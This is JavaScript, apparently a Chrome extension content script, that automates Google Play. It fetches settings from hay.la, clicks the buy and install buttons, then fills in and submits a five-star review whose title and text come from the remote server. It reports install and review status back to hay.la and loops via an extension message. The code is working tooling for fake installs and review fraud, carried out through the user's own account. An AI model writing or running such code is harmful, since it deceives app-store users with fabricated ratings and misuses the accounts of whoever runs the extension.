function UpdateInstallApp( NumberDevies,  StatusInstall,  StatusCommentRating)
{
	var xmlhttp;

	if (window.XMLHttpRequest) {
		xmlhttp = new XMLHttpRequest();
	} else {
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}

	xmlhttp.onreadystatechange = function () {
		if (xmlhttp.readyState == 4) {
			if (xmlhttp.status == 200) {

			}
			else if (xmlhttp.status == 400) {
			
			}
			else {
			
			}
		}
	}

	xmlhttp.open("GET", "https://hay.la/app/UpdateInstallApp?NumberDevies="+NumberDevies+"&StatusInstall="+StatusInstall+"&StatusCommentRating="+StatusCommentRating+"", true);
	xmlhttp.send();

}

var NumberDevies = 0;
var StatusInstall = 0;
var StatusCommentRating = 0;

try
{

var xmlhttp;

if (window.XMLHttpRequest) {
	xmlhttp = new XMLHttpRequest();
} else {
	xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.onreadystatechange = function () {
	if (xmlhttp.readyState == 4) {
		if (xmlhttp.status == 200) {

			var objtime = JSON.parse(xmlhttp.responseText);
			
			//
			document.getElementsByClassName('price buy')[0].click();
			
			setTimeout(function(){
			NumberDevies = document.getElementsByClassName('device-selector-dropdown-child').length;
			if(NumberDevies > 0 )
			{
				StatusInstall = 1;
			}
			
			document.getElementById('purchase-ok-button').click();}, objtime[0].sleepclickinstallapp * 1000);
			
			setTimeout(function(){

			var xmlhttp;

			if (window.XMLHttpRequest) {
				xmlhttp = new XMLHttpRequest();
			} else {
				xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			}

			xmlhttp.onreadystatechange = function () {
				if (xmlhttp.readyState == 4) {
					if (xmlhttp.status == 200) {

						var obj3 = JSON.parse(xmlhttp.responseText);
						
						try
						{
						document.getElementsByClassName('play-button id-enable-gpr apps')[0].click();
						document.getElementsByClassName('id-write-button play-button')[0].click();
						document.getElementsByClassName('review-input-text-box write-review-title')[0].value = obj3[0].Title;
						document.getElementsByClassName('review-input-text-box write-review-comment')[0].value = obj3[0].Comment;
						document.getElementsByClassName('star-common fifth-star')[0].click();
						document.getElementsByClassName('id-submit-review play-button apps')[0].click();
						
						//
						document.getElementsByClassName('play-button id-enable-gpr apps')[0].click();
						document.getElementsByClassName('id-write-button play-button')[0].click();
						var checktitle = document.getElementsByClassName('write-review-panel')[0].getAttribute("style");
						
						
						if(checktitle != null && checktitle == "")
						{
							StatusCommentRating = 1;
						}
						
						setTimeout(function(){
							chrome.extension.sendMessage({
									action: "sendagain"		
							});
						}, 3 * 1000);
						
						UpdateInstallApp(NumberDevies,StatusInstall,StatusCommentRating);
						}catch(ex)
						{
							setTimeout(function(){
							chrome.extension.sendMessage({
									action: "sendagain"		
							});
							}, 3 * 1000);
						}
						
						
					}
					else if (xmlhttp.status == 400) {
					
					}
					else {
					
					}
				}
			}

			xmlhttp.open("GET", "https://hay.la/app/getComment?type=1", true);
			xmlhttp.send();

			}, (objtime[0].sleepcommentinstallapp + objtime[0].sleepclickinstallapp) * 1000);
			//
			
		}
		else if (xmlhttp.status == 400) {
		
		}
		else {
		
		}
	}
}

xmlhttp.open("GET", "https://hay.la/app/getConfig?version=1", true);
xmlhttp.send();

}catch(ex)
{
	UpdateInstallApp(NumberDevies,StatusInstall,StatusCommentRating);
	setTimeout(function(){
		chrome.extension.sendMessage({
				action: "sendagain"		
		});
	}, 3 * 1000);
}